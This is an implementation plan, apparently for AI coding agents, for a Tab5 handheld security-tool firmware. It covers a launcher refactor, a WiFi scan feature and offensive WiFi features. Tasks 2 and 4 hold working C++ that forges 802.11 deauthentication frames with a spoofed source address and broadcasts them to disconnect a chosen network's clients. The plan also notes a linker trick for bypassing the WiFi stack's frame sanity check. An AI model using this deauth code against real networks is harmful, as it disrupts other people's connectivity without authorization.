# Phase 2 (Core): Tab5-Native WiFi/BLE Spikes + Representative Features Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Resolve Phase 2's two biggest architectural unknowns (raw 802.11 frame injection and BLE scan/observer mode, both over esp-hosted/raw-NimBLE) on real hardware, and land one working, launcher-reachable feature per risk category so the pattern is proven end-to-end before the remaining ~20 features (deferred to a second plan) get built on top of it.

**Architecture:** Every feature is a `FeatureModule` with `Affinity::TAB5_NATIVE`, living under `firmware/tab5/src/features/wifi/` or `.../ble/`, registered into the existing `FeatureRegistry`, reachable from a generalized (this plan's Task 1) launcher. WiFi features call the standard Arduino/ESP-IDF `<esp_wifi.h>`/`<WiFi.h>` APIs directly — esp-hosted's WiFiRemote proxies these transparently to the C6 co-processor (confirmed, Phase 1 Task 9); do not call the internal `esp_wifi_remote_*` RPC functions directly, they are what `<esp_wifi.h>`'s standard entry points call into under the hood. BLE features call the raw ESP-IDF NimBLE C API (`ble_gap_*`) — NimBLE-Arduino does not compile for the ESP32-P4 at all (Phase 1 Task 13, maintainer-confirmed) — and must reuse the single NimBLE host stack that `c2link_ble.cpp` already brings up at boot (`nimble_port_init()` can only run once per device), not initialize a second one.

**Tech Stack:** Arduino-ESP32 v3.3.11 (pioarduino), LVGL 9.x, raw ESP-IDF NimBLE C API, esp-hosted WiFiRemote (transparent via `<WiFi.h>`/`<esp_wifi.h>`).

## Global Constraints

- All Tab5-native BLE code uses the raw ESP-IDF NimBLE C API (`ble_gap_disc`, `ble_gap_event`, etc.), never NimBLE-Arduino — confirmed incompatible with ESP32-P4 in this project's installed framework (Phase 1 Task 13).
- The NimBLE host (`nimble_port_init()`, the `host_task` FreeRTOS task, the `ble_hs_cfg.sync_cb` sync callback) is owned by `firmware/tab5/src/hal/c2link_ble.cpp` and brought up once during `setup()`. No other file may call `nimble_port_init()` — BLE scan/spam features call `ble_gap_disc()`/`ble_gap_adv_start()` against the already-running host, guarded by a "is the host synced yet" check this plan adds to `c2link_ble.h`.
- WiFi features call standard `<esp_wifi.h>` functions (`esp_wifi_80211_tx`, `esp_wifi_set_promiscuous`, `esp_wifi_set_promiscuous_rx_cb`, `esp_wifi_deauth_sta`) directly — these route through esp-hosted's WiFiRemote to the C6 transparently, the same way `<WiFi.h>`'s own calls already do (Phase 1 Task 9 finding). Do not call `esp_wifi_remote_*` names from application code.
- Every feature module is `Affinity::TAB5_NATIVE`, registered via `FeatureRegistry::register_module()`, with a real `on_start` callback (no `nullptr` placeholders) — Tab5-native features run locally and are invoked by the launcher tile's click handler calling `on_start()` directly, unlike Cardputer-ADV-affinity features where `on_start` lives on the satellite and Tab5 only holds a descriptor.
- Capture files (PMKID/handshake) go to `/quarky/captures/wifi/` on the SD card, matching the spec's established `/quarky/captures/<category>/` convention.
- No feature in this plan may block `loop()` for more than ~50ms at a time (LVGL, C2 transport polling, and the status bar all run from the same task) — long-running operations (scan, capture) must be structured as a start/poll/stop state machine driven from `loop()`, not a blocking call inside a button's click handler.

---

## Task 1: Shell Launcher Generalization (Multi-Category Tiles, Generic `on_start` Dispatch)

**Files:**
- Modify: `firmware/tab5/src/ui/shell.cpp`
- Modify: `firmware/tab5/src/ui/shell.h` (if it declares anything beyond `Shell::build` — check current content first; add nothing beyond what's needed)

**Interfaces:**
- Consumes: `FeatureRegistry::for_each_in_category(Category, std::function<void(const FeatureModule&)>)`, `FeatureModule::on_start` (both already exist, Phase 1 Tasks 4/20).
- Produces: `Shell::build(FeatureRegistry&)` unchanged signature, but now builds a **category picker** (one tile per non-empty category: currently UTILITY, and after this plan's later tasks, WIFI and BLE) instead of a flat single-category grid. Tapping a category tile pushes a new **category screen** (`build_category_screen(FeatureRegistry&, Category)`, new function) showing one tile per registered module in that category, each tile's click handler calling `m.on_start()` directly — this is what every later task in this plan (and the deferred second plan) relies on to make its feature reachable, instead of each task having to hand-edit `shell.cpp`'s hardcoded `if (strcmp(...))` chain the way Task 20's ping feature currently does.

### Why this task exists

`Shell::build` (as of `main`) only loops `Category::UTILITY` and dispatches clicks via a hardcoded `if (strcmp(m.id, "ping") == 0)` check — its own comment already flags this as unsustainable "once more than one UTILITY module is registered." Phase 2 registers 2 new modules in this plan alone (6+ more in the deferred second plan), across two categories the current code doesn't even loop over. This task is a real prerequisite, not scope creep — every later task in this plan depends on it to make its feature tappable at all.

- [ ] **Step 1: Read the current file to confirm nothing else changed underneath this plan**

Run: `cat firmware/tab5/src/ui/shell.cpp`
Expected: matches the version referenced above (status bar, single UTILITY loop, hardcoded ping dispatch, hardcoded keyboard-test and pairing tiles below the loop). If it doesn't match, stop and reconcile before proceeding — this task's diff assumes this exact starting shape.

- [ ] **Step 2: Rewrite `shell.cpp` for multi-category + generic dispatch**

```cpp
// firmware/tab5/src/ui/shell.cpp
#include "shell.h"
#include "screen_stack.h"
#include "keyboard_test_screen.h"
#include "pairing_screen.h"
#include "../features/ping_feature.h"
#include <lvgl.h>
#include <cstring>

lv_obj_t *Shell::status_bar_ = nullptr;

static const struct { Category cat; const char *label; } kCategoryTiles[] = {
    {Category::UTILITY, "Utility"},
    {Category::WIFI, "WiFi"},
    {Category::BLE, "BLE"},
};

// Registry captured by reference in the click handler's user_data (a pointer
// to it, since FeatureRegistry outlives every screen -- it's a global in
// main.cpp) so the category screen can be built lazily, on tap, rather than
// pre-building all three up front.
lv_obj_t *build_category_screen(FeatureRegistry &registry, Category cat) {
    lv_obj_t *screen = lv_obj_create(nullptr);
    lv_obj_set_layout(screen, LV_LAYOUT_GRID);

    lv_obj_t *back = lv_button_create(screen);
    lv_obj_align(back, LV_ALIGN_TOP_LEFT, 10, 10);
    lv_obj_t *back_label = lv_label_create(back);
    lv_label_set_text(back_label, "Back");
    lv_obj_add_event_cb(back, [](lv_event_t *e) { ScreenStack::pop(); }, LV_EVENT_CLICKED, nullptr);

    registry.for_each_in_category(cat, [screen](const FeatureModule &m) {
        lv_obj_t *tile = lv_button_create(screen);
        lv_obj_set_size(tile, 200, 100);
        lv_obj_t *label = lv_label_create(tile);
        lv_label_set_text(label, m.name);

        // Generic dispatch: every registered module (this plan onward) is
        // required (Global Constraints) to have a real on_start -- store the
        // function pointer itself as the event's user_data so the click
        // handler needs no per-id branching.
        lv_obj_add_event_cb(tile, [](lv_event_t *e) {
            FeatureStartFn fn = (FeatureStartFn)lv_event_get_user_data(e);
            if (fn) fn();
        }, LV_EVENT_CLICKED, (void *)m.on_start);
    });

    return screen;
}

lv_obj_t *Shell::build(FeatureRegistry &registry) {
    lv_obj_t *root = lv_obj_create(nullptr);
    lv_obj_set_layout(root, LV_LAYOUT_FLEX);
    lv_obj_set_flex_flow(root, LV_FLEX_FLOW_COLUMN);

    status_bar_ = lv_obj_create(root);
    lv_obj_set_size(status_bar_, LV_PCT(100), 40);
    lv_obj_t *battery_label = lv_label_create(status_bar_);
    lv_label_set_text(battery_label, "Battery: --%");
    lv_obj_t *link_label = lv_label_create(status_bar_);
    lv_label_set_text(link_label, "Cardputer-ADV: disconnected");
    lv_obj_align(link_label, LV_ALIGN_RIGHT_MID, 0, 0);

    lv_obj_t *launcher = lv_obj_create(root);
    lv_obj_set_size(launcher, LV_PCT(100), LV_PCT(100));
    lv_obj_set_layout(launcher, LV_LAYOUT_GRID);

    // One tile per category that has at least one registered module --
    // empty categories are skipped so e.g. BLE doesn't show as a dead end
    // before this plan's BLE tasks land.
    for (const auto &entry : kCategoryTiles) {
        if (registry.count_in_category(entry.cat) == 0) continue;
        lv_obj_t *tile = lv_button_create(launcher);
        lv_obj_set_size(tile, 200, 100);
        lv_obj_t *label = lv_label_create(tile);
        lv_label_set_text(label, entry.label);
        lv_obj_add_event_cb(tile, [](lv_event_t *e) {
            auto *ctx = (std::pair<FeatureRegistry *, Category> *)lv_event_get_user_data(e);
            ScreenStack::push(build_category_screen(*ctx->first, ctx->second));
        }, LV_EVENT_CLICKED, new std::pair<FeatureRegistry *, Category>(&registry, entry.cat));
    }

    // Debug launcher tile for testing lv_keyboard
    lv_obj_t *kb_test_tile = lv_button_create(launcher);
    lv_obj_set_size(kb_test_tile, 200, 100);
    lv_obj_t *kb_test_label = lv_label_create(kb_test_tile);
    lv_label_set_text(kb_test_label, "[debug] Keyboard Test");
    lv_obj_add_event_cb(kb_test_tile, [](lv_event_t *e) {
        ScreenStack::push(build_keyboard_test_screen());
    }, LV_EVENT_CLICKED, nullptr);

    lv_obj_t *pairing_tile = lv_button_create(launcher);
    lv_obj_set_size(pairing_tile, 200, 100);
    lv_obj_t *pairing_label = lv_label_create(pairing_tile);
    lv_label_set_text(pairing_label, "Pair Satellite");
    lv_obj_add_event_cb(pairing_tile, [](lv_event_t *e) {
        ScreenStack::push(build_pairing_screen());
    }, LV_EVENT_CLICKED, nullptr);

    return root;
}
```

Note the `Category::UTILITY` tile now wraps `ping` in a category screen instead of showing it directly on the root launcher — this is a deliberate behavior change (matches the new multi-category pattern uniformly) rather than an oversight; call it out in the task report so the reviewer isn't surprised the root launcher's tile count changed.

- [ ] **Step 2b: Add the missing `count_in_category` method `Shell::build` now calls**

```cpp
// shared/feature_contract/src/feature_registry.h -- add to the public section
int count_in_category(Category c) const;
```

```cpp
// shared/feature_contract/src/feature_registry.cpp -- add
int FeatureRegistry::count_in_category(Category c) const {
    int n = 0;
    for (int i = 0; i < count_; i++) {
        if (modules_[i].category == c) n++;
    }
    return n;
}
```

- [ ] **Step 3: Extend the native registry test for the new method**

```cpp
// shared/feature_contract/test/test_registry.cpp -- add
void test_count_in_category() {
    FeatureRegistry r;
    r.register_module({"a", "A", Category::WIFI, Affinity::TAB5_NATIVE});
    r.register_module({"b", "B", Category::WIFI, Affinity::TAB5_NATIVE});
    r.register_module({"c", "C", Category::BLE, Affinity::TAB5_NATIVE});
    TEST_ASSERT_EQUAL(2, r.count_in_category(Category::WIFI));
    TEST_ASSERT_EQUAL(1, r.count_in_category(Category::BLE));
    TEST_ASSERT_EQUAL(0, r.count_in_category(Category::NFC));
}
```

Register this in the suite's `main()`/`RUN_TEST` block alongside the existing tests (check the file's current runner structure and match it — do not invent a different test-running convention for this one function).

- [ ] **Step 4: Run the native test suite**

Run: `cd shared/feature_contract && pio test -e native`
Expected: all tests PASS including the new `test_count_in_category`.

- [ ] **Step 5: Compile the Tab5 firmware**

Run: `cd firmware/tab5 && pio run`
Expected: SUCCESS. (No hardware behavior to verify yet — `count_in_category` will return 0 for WIFI/BLE until this plan's later tasks register modules, so the category tiles simply won't appear yet; that's expected and will be re-verified visually once Task 3 registers the first WiFi module.)

- [ ] **Step 6: Commit**

```bash
git add firmware/tab5/src/ui/shell.cpp shared/feature_contract/src/feature_registry.h \
        shared/feature_contract/src/feature_registry.cpp shared/feature_contract/test/test_registry.cpp
git commit -m "Generalize Tab5 shell launcher: multi-category tiles, generic on_start dispatch"
```

---

## Task 2: WiFi Raw-Frame-Injection Spike

**Files:**
- Create: `firmware/tab5/src/features/wifi/wifi_tx_spike.h`
- Create: `firmware/tab5/src/features/wifi/wifi_tx_spike.cpp`
- Modify: `firmware/tab5/src/main.cpp` (temporary serial-triggered call for this spike only — see Step 4)

**Interfaces:**
- Consumes: nothing new — this task deliberately does not touch `FeatureRegistry` or the launcher, since a spike's job is to answer a yes/no question on real hardware as fast as possible, not to ship a UI.
- Produces: a real, hardware-confirmed answer to two questions that gate every other WiFi task in this plan (and most of the deferred second plan): (1) does `esp_wifi_80211_tx()` reach the air through esp-hosted's WiFiRemote at all, and (2) does a frame with a **spoofed source address** (required for a real deauth/beacon-spam attack, since you're impersonating someone else's AP or station) survive whatever sanity-checking exists, or does the C6's stock esp-hosted firmware silently drop it.

### Why question (2) matters as much as question (1)

Bruce's and Poseidon's deauth implementations both need a linker-time trick (`-Wl,-zmuldefs` overriding `ieee80211_raw_frame_sanity_check`) to transmit spoofed-source frames at all — normal ESP-IDF WiFi firmware rejects them. That trick only works because those donor projects compile their own firmware image, including the WiFi stack, so they can override a symbol in it at link time. On this project's Tab5, the actual 802.11 MAC processing for `esp_wifi_80211_tx()` calls happens on the **ESP32-C6 co-processor**, running Espressif's **stock, precompiled esp-hosted slave firmware** (confirmed different from what this project builds — Phase 1 found the C6's firmware version, 1.4.1, doesn't match the host's expected 2.12.11). This project does not compile or control that firmware image, so the standard link-time override trick may not be applicable at all here — the sanity check, if the C6's slave firmware even has an equivalent one, cannot be patched the same way. This is a genuinely different risk than "does the RPC call exist" (which is already confirmed present — Section 3 of the spec's risk was about API-surface availability, and static analysis of the installed `esp_wifi_remote_api.h` already found `esp_wifi_remote_80211_tx` and `esp_wifi_remote_deauth_sta` both present). The open question is purely: **does a spoofed frame actually leave the antenna, or does the C6 quietly eat it.**

- [ ] **Step 1: Write the spike's TX function**

```cpp
// firmware/tab5/src/features/wifi/wifi_tx_spike.h
#pragma once
namespace WifiTxSpike {
// Sends two raw 802.11 deauthentication frames back-to-back, three seconds
// apart, both targeting a broadcast destination on the given channel:
//   1. Source address = this device's OWN real MAC (esp_wifi_get_mac) --
//      baseline test, should never be rejected by any sanity check since
//      it's not spoofed.
//   2. Source address = a fabricated address (02:00:00:AA:BB:CC, a locally-
//      administered range so it can't collide with a real vendor OUI) --
//      the actually-attack-relevant case.
// Logs the esp_wifi_80211_tx() return code for both. A real answer requires
// an external observer (e.g. a laptop running Wireshark/airodump-ng in
// monitor mode on the same channel) confirming which of the two frames, if
// either, actually appeared over the air -- esp_wifi_80211_tx() returning
// ESP_OK only means the RPC call to the C6 succeeded, not that the C6 chose
// to transmit it.
void run(uint8_t channel);
}
```

```cpp
// firmware/tab5/src/features/wifi/wifi_tx_spike.cpp
#include "wifi_tx_spike.h"
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>

namespace WifiTxSpike {

// IEEE 802.11 deauthentication management frame, fixed 26-byte header +
// 2-byte reason code. Addr1 = destination (broadcast here), Addr2 = source
// (spoofed or real, per the two test frames below), Addr3 = BSSID (set
// equal to Addr2 for this spike -- a real attack would set it to the
// impersonated AP's actual BSSID, irrelevant for this yes/no test).
static void build_deauth_frame(uint8_t *out, const uint8_t src[6]) {
    out[0] = 0xC0; out[1] = 0x00;                 // Frame Control: mgmt, subtype=deauth
    out[2] = 0x00; out[3] = 0x00;                 // Duration
    memset(out + 4, 0xFF, 6);                     // Addr1: broadcast
    memcpy(out + 10, src, 6);                     // Addr2: source
    memcpy(out + 16, src, 6);                     // Addr3: BSSID
    out[22] = 0x00; out[23] = 0x00;                // Seq-ctrl
    out[24] = 0x01; out[25] = 0x00;                // Reason code 1 (unspecified)
}

void run(uint8_t channel) {
    uint8_t frame[26];
    uint8_t own_mac[6];
    esp_wifi_get_mac(WIFI_IF_STA, own_mac);

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    build_deauth_frame(frame, own_mac);
    esp_err_t rc1 = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
    Serial.printf("quarky-tab5: [wifi-tx-spike] own-MAC deauth tx rc=0x%x (%s)\n",
                  rc1, rc1 == ESP_OK ? "OK" : "FAILED");

    delay(3000);

    uint8_t spoofed[6] = {0x02, 0x00, 0x00, 0xAA, 0xBB, 0xCC};
    build_deauth_frame(frame, spoofed);
    esp_err_t rc2 = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
    Serial.printf("quarky-tab5: [wifi-tx-spike] spoofed-MAC deauth tx rc=0x%x (%s)\n",
                  rc2, rc2 == ESP_OK ? "OK" : "FAILED");
    Serial.println("quarky-tab5: [wifi-tx-spike] done -- check an external monitor-mode "
                    "capture on this channel to confirm which frame(s), if any, "
                    "actually reached the air");
}

} // namespace WifiTxSpike
```

- [ ] **Step 2: Wire a temporary serial trigger to run it (spike only, remove after)**

```cpp
// firmware/tab5/src/main.cpp -- add under the existing #ifdef QUARKY_SERIAL_DEBUG
// block's if/else-if chain (see Task 20's 'k'/'p' triggers for the pattern)
} else if (c == 'x') {
    Serial.println("quarky-tab5: [debug] running WiFi TX spike on channel 6");
    WifiTxSpike::run(6);
}
```

Add `#include "features/wifi/wifi_tx_spike.h"` near the top of `main.cpp` alongside the other feature includes.

- [ ] **Step 3: Compile**

Run: `cd firmware/tab5 && pio run`
Expected: SUCCESS.

- [ ] **Step 4: Real hardware test**

Flash with `-DQUARKY_SERIAL_DEBUG`, connect a WiFi client to the Tab5's own AP first (or use a second AP you control on a known channel) so there's a live 802.11 environment to observe, put an external device (laptop with a monitor-mode-capable WiFi adapter, or a phone running a WiFi analyzer that shows deauth frame counts) on the same channel, trigger via `x` over serial, and record what the external observer actually saw for each of the two frames.

Expected/decision point:
- **Both frames observed over the air:** no sanity-check blocker exists on this path at all — proceed with Task 4 (deauth feature) as scoped.
- **Only the own-MAC frame observed, spoofed frame silently dropped:** the sanity-check risk is real and confirmed. Task 4 must be re-scoped per the spec's Section 3 fallback (move spoofed-source WiFi attacks to Cardputer-ADV, which has a local, self-compiled WiFi stack where the standard override trick applies) rather than attempted on Tab5 — do not proceed with Task 4 as written; stop and get the project owner's decision on whether to re-scope now or defer.
- **Neither frame observed:** `esp_wifi_80211_tx()` itself isn't reaching the air through WiFiRemote at all — a more fundamental blocker than the sanity-check question. Same stop-and-reconcile action as above, but affects more than just spoofed-source features (anything needing raw TX at all, including legitimate beacon/probe construction).

- [ ] **Step 5: Record the real result and commit**

Write the outcome (which frames were/weren't observed, on what evidence) into the task's SDD report. Remove the temporary `'x'` trigger from `main.cpp` before committing — `wifi_tx_spike.{h,cpp}` stay (Task 4 calls into `build_deauth_frame`'s logic, refactor if needed once Task 4 starts) but the main.cpp serial hook was spike-only scaffolding.

```bash
git add firmware/tab5/src/features/wifi/wifi_tx_spike.h firmware/tab5/src/features/wifi/wifi_tx_spike.cpp
git commit -m "WiFi raw-frame-injection spike: confirm esp_wifi_80211_tx over esp-hosted"
```

---

## Task 3: WiFi AP Scan Feature

**Files:**
- Create: `firmware/tab5/src/features/wifi/wifi_common.h`
- Create: `firmware/tab5/src/features/wifi/wifi_common.cpp`
- Create: `firmware/tab5/src/features/wifi/wifi_scan.h`
- Create: `firmware/tab5/src/features/wifi/wifi_scan.cpp`
- Modify: `firmware/tab5/src/main.cpp` (register the module)

**Interfaces:**
- Consumes: `Category::WIFI`, `Affinity::TAB5_NATIVE`, `FeatureRegistry::register_module` (Phase 1 Task 4/20). Task 1's category-screen dispatch (calls `m.on_start()` directly on tap).
- Produces: `WifiApInfo` struct and `wifi_scan_aps()` function, consumed by Task 4 (deauth's target picker) and the deferred second plan's remaining WiFi features that need an AP list (karma, evil portal, etc.).

- [ ] **Step 1: Write the shared AP-list model**

```cpp
// firmware/tab5/src/features/wifi/wifi_common.h
#pragma once
#include <cstdint>
#include <cstddef>

struct WifiApInfo {
    char ssid[33];       // 802.11 SSID max is 32 bytes + null terminator
    uint8_t bssid[6];
    int8_t rssi;
    uint8_t channel;
    bool open;            // true if no auth/encryption required
};

// Runs a blocking WiFi.scanNetworks() and fills out[] with up to max_count
// results (WiFi.scanNetworks()'s own default RSSI-descending order).
// Returns the number of APs written (0 on failure/no results found). Safe
// to call repeatedly; each call re-scans and replaces the prior results.
// Blocks for the duration of the scan (typically 2-4s) -- callers running
// this from a UI must not call it directly from a button's click handler on
// the main task without the caller understanding this stalls LVGL for that
// duration; Task 3's own screen accepts this for a first, minimal scan
// button (see Step 3's note), a background/async scan is deferred to the
// second plan if it proves too janky in practice.
int wifi_scan_aps(WifiApInfo *out, int max_count);

void wifi_bssid_to_str(const uint8_t bssid[6], char out[18]);
```

```cpp
// firmware/tab5/src/features/wifi/wifi_common.cpp
#include "wifi_common.h"
#include <WiFi.h>
#include <cstdio>
#include <cstring>

int wifi_scan_aps(WifiApInfo *out, int max_count) {
    int n = WiFi.scanNetworks();
    if (n <= 0) return 0;
    int written = 0;
    for (int i = 0; i < n && written < max_count; i++) {
        WifiApInfo &info = out[written];
        strncpy(info.ssid, WiFi.SSID(i).c_str(), sizeof(info.ssid) - 1);
        info.ssid[sizeof(info.ssid) - 1] = '\0';
        memcpy(info.bssid, WiFi.BSSID(i), 6);
        info.rssi = (int8_t)WiFi.RSSI(i);
        info.channel = (uint8_t)WiFi.channel(i);
        info.open = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN);
        written++;
    }
    WiFi.scanDelete();
    return written;
}

void wifi_bssid_to_str(const uint8_t bssid[6], char out[18]) {
    snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
}
```

- [ ] **Step 2: Write the feature module and screen**

```cpp
// firmware/tab5/src/features/wifi/wifi_scan.h
#pragma once
namespace WifiScanFeature {
void register_module();
void start(); // matches FeatureStartFn's void(*)() signature
}
```

```cpp
// firmware/tab5/src/features/wifi/wifi_scan.cpp
#include "wifi_scan.h"
#include "wifi_common.h"
#include "../../ui/screen_stack.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <cstdio>

extern FeatureRegistry g_registry;

namespace WifiScanFeature {

static lv_obj_t *build_screen() {
    lv_obj_t *screen = lv_obj_create(nullptr);
    lv_obj_set_layout(screen, LV_LAYOUT_FLEX);
    lv_obj_set_flex_flow(screen, LV_FLEX_FLOW_COLUMN);

    lv_obj_t *back = lv_button_create(screen);
    lv_obj_t *back_label = lv_label_create(back);
    lv_label_set_text(back_label, "Back");
    lv_obj_add_event_cb(back, [](lv_event_t *e) { ScreenStack::pop(); }, LV_EVENT_CLICKED, nullptr);

    lv_obj_t *list = lv_list_create(screen);
    lv_obj_set_size(list, LV_PCT(100), LV_PCT(85));

    static WifiApInfo aps[32];
    int n = wifi_scan_aps(aps, 32);
    if (n == 0) {
        lv_list_add_text(list, "No networks found");
    }
    for (int i = 0; i < n; i++) {
        char bssid_str[18];
        wifi_bssid_to_str(aps[i].bssid, bssid_str);
        char row[80];
        snprintf(row, sizeof(row), "%s  ch%d  %ddBm  %s", aps[i].ssid,
                 aps[i].channel, aps[i].rssi, aps[i].open ? "OPEN" : "");
        lv_list_add_button(list, LV_SYMBOL_WIFI, row);
    }

    return screen;
}

void register_module() {
    g_registry.register_module({"wifi_scan", "WiFi Scan", Category::WIFI,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    ScreenStack::push(build_screen());
}

} // namespace WifiScanFeature
```

- [ ] **Step 3: Register on boot**

```cpp
// firmware/tab5/src/main.cpp -- alongside PingFeature::register_module()
#include "features/wifi/wifi_scan.h"
// in setup(), after PingFeature::register_module():
WifiScanFeature::register_module();
```

- [ ] **Step 4: Compile**

Run: `cd firmware/tab5 && pio run`
Expected: SUCCESS.

- [ ] **Step 5: Real hardware verification**

Flash, confirm a "WiFi" category tile now appears on the root launcher (Task 1's `count_in_category` should now return 1 for `Category::WIFI`), tap it, confirm a "WiFi Scan" tile appears inside, tap it, confirm real APs in range are listed with plausible SSID/channel/RSSI values matching what a phone's own WiFi list shows for the same environment.

- [ ] **Step 6: Commit**

```bash
git add firmware/tab5/src/features/wifi/wifi_common.h firmware/tab5/src/features/wifi/wifi_common.cpp \
        firmware/tab5/src/features/wifi/wifi_scan.h firmware/tab5/src/features/wifi/wifi_scan.cpp \
        firmware/tab5/src/main.cpp
git commit -m "Add WiFi AP scan feature (Tab5-native, first WiFi category tile)"
```

---

## Task 4: WiFi Deauth Feature (Single Target)

**Files:**
- Create: `firmware/tab5/src/features/wifi/wifi_deauth.h`
- Create: `firmware/tab5/src/features/wifi/wifi_deauth.cpp`
- Modify: `firmware/tab5/src/features/wifi/wifi_tx_spike.h` (expose `build_deauth_frame` for reuse — rename to a shared name, see Step 1)
- Modify: `firmware/tab5/src/main.cpp` (register the module)

**Interfaces:**
- Consumes: `WifiApInfo`/`wifi_scan_aps` (Task 3), Task 2's spike result (this task's scope is contingent on it — see below), `build_deauth_frame`-equivalent logic (Task 2, refactored into a reusable header).
- Produces: `WifiDeauthFeature::register_module()`/`start()`, following the same shape as Task 3.

**Contingent on Task 2's result:** if Task 2 found the spoofed-source frame was silently dropped, this task as written does not apply — stop and get direction on re-scoping to Cardputer-ADV instead (per spec Section 3) rather than implementing a feature that cannot work. The steps below assume Task 2 confirmed spoofed-source frames do reach the air.

> **DEFERRED (2026-08-10, real hardware result):** Task 2's real spike found `esp_wifi_80211_tx()` returns `ESP_ERR_NOT_SUPPORTED` on the Tab5 for both own-MAC and spoofed-MAC frames — worse than the "silently dropped" contingency above anticipated; raw frame injection isn't usable through esp-hosted WiFiRemote at all. Per the project owner's explicit direction, this task is **not implemented as part of this plan**. It is re-scoped to a Cardputer-ADV-affinity feature (native, non-hosted ESP32-S3 WiFi — no RPC-proxy limitation) and deferred to whichever future phase does real Cardputer-ADV WiFi feature work (Phase 5 or later), not attempted now. The steps below are left in place as real, considered design work — the frame-building logic (`wifi_tx_spike.h`'s `build_deauth_frame`, already merged) and the target-selection UI pattern remain valid reference material for whoever picks this up on Cardputer-ADV later; only the *host device* changes, not the underlying approach. Task 5 (WiFi Spectrum Analyzer) is next in this plan's actual execution order.

- [ ] **Step 1: Promote the spike's frame-builder to a shared header**

```cpp
// firmware/tab5/src/features/wifi/wifi_tx_spike.h -- add alongside the existing run()
namespace WifiTxSpike {
void run(uint8_t channel);
// Exposed for reuse by real attack features (Task 4 onward) once the spike
// confirmed spoofed-source frames reach the air. dest/src/bssid are all
// 6-byte MAC arrays; out must be at least 26 bytes.
void build_deauth_frame(uint8_t *out, const uint8_t dest[6], const uint8_t src[6], const uint8_t bssid[6]);
}
```

Update `wifi_tx_spike.cpp`'s existing `build_deauth_frame` (currently `static`, currently hardcodes dest=broadcast and src=bssid) to the more general 3-address form above, and update the spike's own `run()` to call it with `dest=broadcast, bssid=src` (matching its original test behavior exactly, just via the now-shared function) so Task 2's already-recorded real-hardware result stays valid for the refactored code path.

- [ ] **Step 2: Write the deauth feature**

```cpp
// firmware/tab5/src/features/wifi/wifi_deauth.h
#pragma once
namespace WifiDeauthFeature {
void register_module();
void start();
}
```

```cpp
// firmware/tab5/src/features/wifi/wifi_deauth.cpp
#include "wifi_deauth.h"
#include "wifi_common.h"
#include "wifi_tx_spike.h"
#include "../../ui/screen_stack.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <esp_wifi.h>
#include <cstdio>

extern FeatureRegistry g_registry;

namespace WifiDeauthFeature {

static void send_deauth_burst(const WifiApInfo &target) {
    esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t frame[26];
    // Impersonate the target AP (src = bssid = the real AP's own address) --
    // this is the actually-attack-relevant case Task 2's spike confirmed
    // reaches the air.
    for (int i = 0; i < 5; i++) {
        WifiTxSpike::build_deauth_frame(frame, broadcast, target.bssid, target.bssid);
        esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
        delay(100);
    }
}

static lv_obj_t *build_screen() {
    lv_obj_t *screen = lv_obj_create(nullptr);
    lv_obj_set_layout(screen, LV_LAYOUT_FLEX);
    lv_obj_set_flex_flow(screen, LV_FLEX_FLOW_COLUMN);

    lv_obj_t *back = lv_button_create(screen);
    lv_obj_t *back_label = lv_label_create(back);
    lv_label_set_text(back_label, "Back");
    lv_obj_add_event_cb(back, [](lv_event_t *e) { ScreenStack::pop(); }, LV_EVENT_CLICKED, nullptr);

    lv_obj_t *hint = lv_label_create(screen);
    lv_label_set_text(hint, "Select a target AP to deauth its clients:");

    lv_obj_t *list = lv_list_create(screen);
    lv_obj_set_size(list, LV_PCT(100), LV_PCT(80));

    static WifiApInfo aps[32];
    int n = wifi_scan_aps(aps, 32);
    for (int i = 0; i < n; i++) {
        char row[64];
        snprintf(row, sizeof(row), "%s (ch%d)", aps[i].ssid, aps[i].channel);
        lv_obj_t *btn = lv_list_add_button(list, LV_SYMBOL_WARNING, row);
        lv_obj_add_event_cb(btn, [](lv_event_t *e) {
            int idx = (int)(intptr_t)lv_event_get_user_data(e);
            send_deauth_burst(aps[idx]);
        }, LV_EVENT_CLICKED, (void *)(intptr_t)i);
    }

    return screen;
}

void register_module() {
    g_registry.register_module({"wifi_deauth", "WiFi Deauth", Category::WIFI,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    ScreenStack::push(build_screen());
}

} // namespace WifiDeauthFeature
```

- [ ] **Step 3: Register on boot**

```cpp
// firmware/tab5/src/main.cpp
#include "features/wifi/wifi_deauth.h"
// in setup():
WifiDeauthFeature::register_module();
```

- [ ] **Step 4: Compile**

Run: `cd firmware/tab5 && pio run`
Expected: SUCCESS.

- [ ] **Step 5: Real hardware verification**

Against a WiFi network **you own and control** (this is a real attack primitive — do not test against networks you don't have authorization for), with a client device connected to it: tap the target AP from the list, confirm the client device visibly disconnects/shows a deauth event, and (if available) confirm via the same external monitor-mode observer used in Task 2 that the frames are genuinely reaching the air with the target's spoofed BSSID as source.

- [ ] **Step 6: Commit**

```bash
git add firmware/tab5/src/features/wifi/wifi_deauth.h firmware/tab5/src/features/wifi/wifi_deauth.cpp \
        firmware/tab5/src/features/wifi/wifi_tx_spike.h firmware/tab5/src/features/wifi/wifi_tx_spike.cpp \
        firmware/tab5/src/main.cpp
git commit -m "Add WiFi single-target deauth feature, real hardware verified"
```

---

## Task 5: WiFi Spectrum Analyzer

**Files:**
- Create: `firmware/tab5/src/features/wifi/wifi_spectrum.h`
- Create: `firmware/tab5/src/features/wifi/wifi_spectrum.cpp`
- Modify: `firmware/tab5/src/main.cpp` (register the module)

**Interfaces:**
